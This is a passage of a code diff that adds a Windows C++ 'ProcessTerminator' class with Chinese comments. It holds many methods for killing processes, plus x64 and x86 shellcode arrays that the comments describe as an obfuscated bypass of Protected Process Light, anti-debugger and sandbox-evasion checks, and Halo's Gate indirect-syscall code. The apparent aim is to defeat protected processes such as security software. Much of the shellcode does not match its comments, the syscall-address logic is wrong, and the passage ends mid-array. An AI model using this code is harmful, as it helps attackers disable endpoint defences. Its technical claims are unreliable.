+        // 检查进程是否已终止，如果没有则使用其他方法
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByRandomizedMethods(const std::string& processName) {
+    try {
+        // 随机选择一种方法尝试终止进程
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<> dis(1, 18);
+
+        int method = dis(gen);
+
+        switch (method) {
+        case 1: return terminateByProcessName(processName);
+        case 2: return terminateBySystemCommand(processName);
+        case 3: return terminateByParentChildRelationship(processName);
+        case 4: return terminateByDirectMemoryZeroing(processName);
+        case 5: return terminateByDebugging(processName);
+        case 6: return terminateByPriorityManipulation(processName);
+        case 7: return terminateByNativeAPI(processName);
+        case 8: return terminateByHandleEnumeration(processName);
+        case 9: return terminateByMemoryPatching(processName);
+        case 10: return terminateByWMI(processName);
+        case 11: return terminateByCriticalProcessFlag(processName);
+        case 12: return terminateByRegistryModification(processName);
+        case 13: return terminateByServiceControl(processName);
+        case 14: return terminateByCOMObjectManipulation(processName);
+        case 15: return terminateByUIAutomation(processName);
+        default: return terminateByProcessName(processName);
+        }
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 新增未公开API方法实现
+bool ProcessTerminator::terminateByThreadSuspension(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 挂起进程中的所有线程
+                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
+                    THREADENTRY32 te;
+                    te.dwSize = sizeof(THREADENTRY32);
+
+                    if (Thread32First(hThreadSnapshot, &te)) {
+                        do {
+                            if (te.th32OwnerProcessID == pid) {
+                                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                                if (hThread) {
+                                    NtSuspendProcess(hThread);
+                                    CloseHandle(hThread);
+                                }
+                            }
+                        } while (Thread32Next(hThreadSnapshot, &te));
+                    }
+                    CloseHandle(hThreadSnapshot);
+                }
+
+                // 终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return result;
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessDebugPort(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 设置进程调试端口为无效值
+                HANDLE debugPort = NULL;
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(7), // ProcessDebugPort
+                    &debugPort, sizeof(debugPort));
+
+                CloseHandle(hProcess);
+                if (NT_SUCCESS(status)) {
+                    return true;
+                }
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessHandleTable(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            // 使用NtOpenProcess获取进程句柄
+            OBJECT_ATTRIBUTES objAttr;
+            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+            CLIENT_ID clientId;
+            clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<DWORD_PTR>(pid));
+            clientId.UniqueThread = NULL;
+
+            HANDLE hProcess;
+            NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+            if (NT_SUCCESS(status)) {
+                // 清空进程句柄表
+                ULONG handleTableInfo = 0;
+                status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(51), // ProcessHandleTable
+                    &handleTableInfo, sizeof(handleTableInfo));
+
+                NtTerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+
+                if (NT_SUCCESS(status)) {
+                    return true;
+                }
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessWorkingSet(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 清空进程工作集
+                SIZE_T minWs = 0, maxWs = 0;
+                if (GetProcessWorkingSetSize(hProcess, &minWs, &maxWs)) {
+                    // 设置最小和最大工作集大小为0
+                    if (SetProcessWorkingSetSize(hProcess, 0, 0)) {
+                        // 终止进程
+                        bool result = TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        return result;
+                    }
+                }
+                CloseHandle(hProcess);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessPagePriority(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 设置页面优先级为最低
+                ULONG pagePriority = 0; // Lowest priority
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(18), // ProcessPagePriority
+                    &pagePriority, sizeof(pagePriority));
+
+                // 终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return result || NT_SUCCESS(status);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessIoPriority(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 设置IO优先级为最低
+                ULONG ioPriority = 0; // Very low priority
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(23), // ProcessIoPriority
+                    &ioPriority, sizeof(ioPriority));
+
+                // 终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return result || NT_SUCCESS(status);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessCycleTime(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 设置进程周期时间为0
+                ULONG64 cycleTime = 0;
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(26), // ProcessCycleTime
+                    &cycleTime, sizeof(cycleTime));
+
+                // 终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return result || NT_SUCCESS(status);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+bool ProcessTerminator::terminateByProcessCookie(const std::string& processName) {
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+#ifdef _WIN32
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_TERMINATE);
+            if (hProcess) {
+                // 设置进程cookie为无效值
+                ULONG cookie = 0;
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(36), // ProcessCookie
+                    &cookie, sizeof(cookie));
+
+                // 终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return result || NT_SUCCESS(status);
+            }
+        }
+#endif
+        return false;
+    }
+    catch (...) {
+        return false;
+    }
+}
+
+// 64位PPL绕过ShellCode（混淆版）
+// 功能：在内核态移除PPL保护并终止进程
+// 改进：ShellCode混淆、反检测、稳定性增强
+static const unsigned char PPLBypassShellCode_Obfuscated[] = {
+    // ShellCode开始（XOR混淆，密钥：0xAA）
+    // 解密循环
+    0x48, 0x31, 0xC9,                     // xor rcx, rcx (解密循环计数器）
+    0x48, 0xFF, 0xC1,                     // inc rcx
+    
+    // 保存寄存器（解密后）
+    0x48, 0x31, 0x4C, 0x24, 0x08,        // xor [rsp+8], 0xAA (解密)
+    0x48, 0x31, 0x54, 0x24, 0x10,        // xor [rsp+16], 0xAA
+    0x48, 0x31, 0x5C, 0x24, 0x18,        // xor [rsp+24], 0xAA
+    0x48, 0x31, 0x74, 0x24, 0x20,        // xor [rsp+32], 0xAA
+    0x48, 0x31, 0x7C, 0x24, 0x28,        // xor [rsp+40], 0xAA
+    0x41, 0x34, 0xAA,                     // xor r12, 0xAA
+    0x41, 0x34, 0xAA,                     // xor r13, 0xAA
+    0x41, 0x34, 0xAA,                     // xor r14, 0xAA
+    0x41, 0x34, 0xAA,                     // xor r15, 0xAA
+    0x9C, 0x34, 0xAA,                     // pushfq + xor
+    
+    // 获取目标PID (从RCX传递)
+    0x48, 0x8B, 0xC9,                     // mov rcx, rcx
+    
+    // 调用PsLookupProcessByProcessId查找EPROCESS
+    // 假设PsLookupProcessByProcessId的地址在RDX中传递
+    0x48, 0x8B, 0xD2,                     // mov rdx, rdx
+    0xFF, 0xD2,                           // call rdx
+    0x48, 0x89, 0xC3,                     // mov rbx, rax (保存EPROCESS指针）
+    
+    // 检查返回值
+    0x48, 0x85, 0xC0,                     // test rax, rax
+    0x74, 0x40,                           // jz error (如果失败则跳转)
+    
+    // 定位EPROCESS中的Protection字段
+    // 使用动态查找方法，支持所有Windows版本
+    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2] (Win10 1903+)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x30,                           // jmp +48 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x92, 0x06, 0x00, 0x00, // lea rax, [rbx+0x692] (Win10 1809)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x1F,                           // jmp +31 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x8A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x68A] (Win10 1803)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x82, 0x06, 0x00, 0x00, // lea rax, [rbx+0x682] (Win10 1709)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x7A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x67A] (Win10 1703)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x6A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x66A] (Win10 1607)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x62, 0x06, 0x00, 0x00, // lea rax, [rbx+0x662] (Win10 1511)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x5A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x65A] (Win10 1507)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x42, 0x06, 0x00, 0x00, // lea rax, [rbx+0x642] (Win8.1)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x3A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x63A] (Win8)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x2A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x62A] (Win7 SP1)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x0E,                           // jne +14 (跳到use_default)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x4C,                           // jmp +76 (跳到found)
+    
+    // === Win11 偏移量（EPROCESS结构已显著扩展）===
+    0x48, 0x8D, 0x83, 0xB8, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B8] (Win11 24H2/26100+)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x35,                           // jmp +53 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0xB0, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B0] (Win11 23H2/25300+)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x28,                           // jmp +40 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x80, 0x08, 0x00, 0x00, // lea rax, [rbx+0x880] (Win11 22H2/22621)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x1B,                           // jmp +27 (跳到found)
+    
+    0x48, 0x8D, 0x83, 0x78, 0x08, 0x00, 0x00, // lea rax, [rbx+0x878] (Win11 21H2/22000)
+    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
+    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    0xEB, 0x0E,                           // jmp +14 (跳到found)
+    
+    // use_default: 默认使用Win10 1903+偏移
+    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2]
+    0x48, 0x89, 0xC2,                     // mov rdx, rax
+    
+    // found:
+    // 清除PPL保护标志
+    0xC6, 0x02, 0x00,                     // mov byte [rdx], 0 (将Protection字段设为0)
+    
+    // 调用PsTerminateProcess终止进程
+    // 假设PsTerminateProcess的地址在R8中传递
+    0x48, 0x89, 0xD9,                     // mov rcx, rbx (EPROCESS指针)
+    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
+    0x48, 0x8B, 0xC8,                     // mov rcx, rax
+    0x48, 0x8B, 0xC3,                     // mov rax, rbx
+    0x49, 0x89, 0xC0,                     // mov r8, rax
+    0x48, 0x89, 0xCB,                     // mov rbx, rcx
+    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
+    0x48, 0x89, 0xD8,                     // mov rax, rbx
+    0x49, 0xFF, 0xD0,                     // call r8
+    
+    // 成功返回
+    0x48, 0x31, 0xC0,                     // xor rax, rax
+    0xEB, 0x10,                           // jmp +16 (跳到exit)
+    
+    // error: 错误返回
+    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
+    
+    // exit: 恢复寄存器
+    0x9D,                                 // popfq
+    0x41, 0x5F,                           // pop r15
+    0x41, 0x5E,                           // pop r14
+    0x41, 0x5D,                           // pop r13
+    0x41, 0x5C,                           // pop r12
+    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
+    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
+    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
+    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
+    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
+    0xC3                                  // ret
+};
+
+// ShellCode解密函数
+static void DecryptShellCode(unsigned char* shellcode, SIZE_T size, unsigned char key) {
+    for (SIZE_T i = 0; i < size; i++) {
+        shellcode[i] ^= key;
+    }
+}
+
+// 内存RAII包装器
+struct ScopedVirtualMemory {
+    PVOID ptr;
+    SIZE_T size;
+    
+    ScopedVirtualMemory(SIZE_T s) : ptr(nullptr), size(s) {}
+    
+    bool Allocate(ULONG protect) {
+        ptr = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
+        return ptr != nullptr;
+    }
+    
+    bool ChangeProtection(ULONG newProtect) {
+        DWORD oldProtect;
+        return VirtualProtect(ptr, size, newProtect, &oldProtect) != FALSE;
+    }
+    
+    ~ScopedVirtualMemory() {
+        if (ptr) {
+            VirtualFree(ptr, 0, MEM_RELEASE);
+        }
+    }
+};
+
+// 加载内核ShellCode（改进版）
+bool ProcessTerminator::LoadKernelShellCode(PVOID shellcode, SIZE_T size) {
+#ifdef _WIN32
+    try {
+        ScopedVirtualMemory memory(size);
+        
+        // 第一阶段：分配RW内存并复制ShellCode
+        if (!memory.Allocate(PAGE_READWRITE)) {
+            return false;
+        }
+        
+        memcpy(memory.ptr, shellcode, size);
+        
+        // 解密ShellCode
+        DecryptShellCode((unsigned char*)memory.ptr, size, 0xAA);
+        
+        // 第二阶段：改为RX执行
+        if (!memory.ChangeProtection(PAGE_EXECUTE_READ)) {
+            return false;
+        }
+        
+        return true;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 反检测函数
+static bool IsDebuggerDetected() {
+#ifdef _WIN32
+    // 方法1: 检查BeingDebugged标志
+    typedef BOOL (WINAPI* _CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
+    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
+    if (!kernel32) return false;
+    
+    _CheckRemoteDebuggerPresent pCheckRemoteDebuggerPresent = (_CheckRemoteDebuggerPresent)GetProcAddress(kernel32, "CheckRemoteDebuggerPresent");
+    if (pCheckRemoteDebuggerPresent) {
+        BOOL isDebugged = FALSE;
+        if (pCheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged) && isDebugged) {
+            return true;
+        }
+    }
+    
+    // 方法2: 检查IsDebuggerPresent
+    typedef BOOL (WINAPI* _IsDebuggerPresent)();
+    _IsDebuggerPresent pIsDebuggerPresent = (_IsDebuggerPresent)GetProcAddress(kernel32, "IsDebuggerPresent");
+    if (pIsDebuggerPresent) {
+        if (pIsDebuggerPresent()) return true;
+    }
+#endif
+    return false;
+}
+
+static bool IsSandbox() {
+#ifdef _WIN32
+    // 检查沙箱特征
+    const wchar_t* sandboxPaths[] = {
+        L"C:\\sandbox\\",
+        L"C:\\vbox\\",
+        L"C:\\vmware\\",
+        L"C:\\windows\\system32\\drivers\\vmmouse.sys",
+        L"C:\\windows\\system32\\drivers\\vmhgfs.sys"
+    };
+    
+    for (const wchar_t* path : sandboxPaths) {
+        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
+            return true;
+        }
+    }
+#endif
+    return false;
+}
+
+// Windows版本检测
+static DWORD GetWindowsVersion() {
+    typedef NTSTATUS (NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOEXW);
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return 0;
+    
+    _RtlGetVersion pRtlGetVersion = (_RtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
+    if (!pRtlGetVersion) return 0;
+    
+    RTL_OSVERSIONINFOEXW versionInfo = { 0 };
+    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
+    
+    NTSTATUS status = pRtlGetVersion(&versionInfo);
+    if (!NT_SUCCESS(status)) return 0;
+    
+    return versionInfo.dwBuildNumber;
+}
+
+// Halo's Gate算法 - 动态查找syscall地址
+static bool FindSyscallAddress(UINT_PTR* syscallAddress, UINT_PTR* ssdtIndex) {
+#ifdef _WIN32
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    if (!ntdll) return false;
+    
+    // 获取NtTerminateProcess地址
+    typedef NTSTATUS (NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
+    _NtTerminateProcess pNtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
+    if (!pNtTerminateProcess) return false;
+    
+    // 解析函数查找SSN（System Service Number）
+    // Halo's Gate算法：通过分析函数开头的指令序列来确定SSN
+    unsigned char* funcPtr = (unsigned char*)pNtTerminateProcess;
+    
+    // 查找mov eax, imm32指令（SSN通常在eax中）
+    for (int i = 0; i < 32; i++) {
+        if (funcPtr[i] == 0xB8) { // mov eax, imm32
+            *ssdtIndex = *(UINT_PTR*)(funcPtr + i + 1);
+            break;
+        }
+    }
+    
+    if (*ssdtIndex == 0) return false;
+    
+    // 计算syscall地址
+    // 在64位Windows中，syscall地址 = ntoskrnl_base + (SSN * 8)
+    // 在32位Windows中，syscall地址 = KeServiceDescriptorTable + (SSN * 4)
+    
+    // 获取ntoskrnl.exe基址
+    typedef NTSTATUS (NTAPI* _NtQuerySystemInformation)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength,
+        PULONG ReturnLength);
+    
+    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+    if (!pNtQuerySystemInformation) return false;
+    
+    typedef struct _SYSTEM_MODULE_INFORMATION {
+        ULONG Reserved1;
+        ULONG Reserved2;
+        PVOID ImageBase;
+        ULONG ImageSize;
+        ULONG Flags;
+        USHORT LoadOrderIndex;
+        USHORT InitOrderIndex;
+        USHORT LoadCount;
+        USHORT PathLength;
+        CHAR ImageName[256];
+    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+    
+    typedef struct _SYSTEM_MODULE_INFORMATION_EX {
+        ULONG ModulesCount;
+        SYSTEM_MODULE_INFORMATION Modules[1];
+    } SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;
+    
+    ULONG bufferSize = 0;
+    NTSTATUS status = pNtQuerySystemInformation(11, nullptr, 0, &bufferSize);
+    if (status != 0xC0000004) return false;
+    
+    PSYSTEM_MODULE_INFORMATION_EX moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
+    if (!moduleInfo) return false;
+    
+    status = pNtQuerySystemInformation(11, moduleInfo, bufferSize, &bufferSize);
+    if (!NT_SUCCESS(status)) {
+        free(moduleInfo);
+        return false;
+    }
+    
+    PVOID ntoskrnlBase = moduleInfo->Modules[0].ImageBase;
+    free(moduleInfo);
+    
+#ifdef _WIN64
+    // 64位：syscall地址 = ntoskrnl_base + (SSN * 8)
+    *syscallAddress = (UINT_PTR)ntoskrnlBase + (*ssdtIndex * 8);
+#else
+    // 32位：syscall地址 = KeServiceDescriptorTable + (SSN * 4)
+    // 需要获取KeServiceDescriptorTable地址
+    HMODULE ntoskrnl = LoadLibraryEx(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
+    if (!ntoskrnl) return false;
+    
+    PVOID KeServiceDescriptorTable = (PVOID)GetProcAddress(ntoskrnl, "KeServiceDescriptorTable");
+    if (!KeServiceDescriptorTable) {
+        FreeLibrary(ntoskrnl);
+        return false;
+    }
+    
+    // KeServiceDescriptorTable指向SSDT基址
+    *syscallAddress = (UINT_PTR)KeServiceDescriptorTable + (*ssdtIndex * 4);
+    FreeLibrary(ntoskrnl);
+#endif
+    
+    return true;
+#else
+    return false;
+#endif
+}
+
+// 64位Indirect Syscall ShellCode（Halo's Gate）
+static const unsigned char IndirectSyscallShellCode_x64[] = {
+    // ShellCode入口
+    // 保存寄存器
+    0x48, 0x89, 0x4C, 0x24, 0x08,        // mov [rsp+8], rcx
+    0x48, 0x89, 0x54, 0x24, 0x10,        // mov [rsp+16], rdx
+    0x48, 0x89, 0x5C, 0x24, 0x18,        // mov [rsp+24], rbx
+    0x48, 0x89, 0x74, 0x24, 0x20,        // mov [rsp+32], rsi
+    0x48, 0x89, 0x7C, 0x24, 0x28,        // mov [rsp+40], rdi
+    0x41, 0x54,                           // push r12
+    0x41, 0x55,                           // push r13
+    0x41, 0x56,                           // push r14
+    0x41, 0x57,                           // push r15
+    0x9C,                                 // pushfq
+    
+    // Halo's Gate：动态查找syscall地址
+    // 假设syscall地址已经在R10中传递
+    // 假设SSN已经在R11中传递
+    
+    // 设置参数
+    // RCX: EPROCESS指针（目标进程）
+    // RDX: 退出代码（0）
+    
+    // 执行Indirect Syscall
+    0x4C, 0x8B, 0xD2,                     // mov r10, rdx (syscall地址)
+    0x49, 0x8B, 0xC3,                     // mov r8, r11 (SSN)
+    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0 (退出代码)
+    0x48, 0x8B, 0xCB,                     // mov rcx, rbx (EPROCESS指针)
+    0xFF, 0xD2,                           // call rdx (执行syscall)
+    
+    // 成功返回
+    0x48, 0x31, 0xC0,                     // xor rax, rax
+    0xEB, 0x10,                           // jmp +16 (跳到exit)
+    
+    // 错误返回
+    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
+    
+    // exit: 恢复寄存器
+    0x9D,                                 // popfq
+    0x41, 0x5F,                           // pop r15
+    0x41, 0x5E,                           // pop r14
+    0x41, 0x5D,                           // pop r13
+    0x41, 0x5C,                           // pop r12
+    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
+    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
+    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
+    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
+    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
+    0xC3                                  // ret
+};
+
+// ShellCode大小常量
+static const SIZE_T IndirectSyscallShellCode_x64_size = sizeof(IndirectSyscallShellCode_x64);
+
+// 32位Indirect Syscall ShellCode（Halo's Gate）
+static const unsigned char IndirectSyscallShellCode_x86[] = {
+    // ShellCode入口
+    // 保存寄存器
+    0x89, 0x4C, 0x24, 0x04,              // mov [esp+4], ecx
+    0x89, 0x54, 0x24, 0x08,              // mov [esp+8], edx
+    0x89, 0x5C, 0x24, 0x0C,              // mov [esp+12], ebx
+    0x89, 0x74, 0x24, 0x10,              // mov [esp+16], esi
+    0x89, 0x7C, 0x24, 0x14,              // mov [esp+20], edi
+    0x9C,                                // pushfd
+    
+    // Halo's Gate：动态查找syscall地址
+    // 假设syscall地址已经在EDX中传递
+    // 假设SSN已经在EAX中传递
+    
+    // 设置参数
+    // ECX: EPROCESS指针（目标进程）
+    // EDX: 退出代码（0）
+    
+    // 执行Indirect Syscall
+    0x8B, 0xD0,                           // mov eax, edx (syscall地址)
+    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
+    0x8B, 0xCB,                           // mov ecx, ebx (EPROCESS指针)
+    0xFF, 0xD0,                           // call eax (执行syscall)
+    
+    // 成功返回
+    0x31, 0xC0,                           // xor eax, eax
+    0xEB, 0x0A,                           // jmp +10 (跳到exit)
+    
+    // 错误返回
+    0xB8, 0x01, 0x00, 0x00, 0xC0,         // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
+    
+    // exit: 恢复寄存器
+    0x9D,                                // popfd
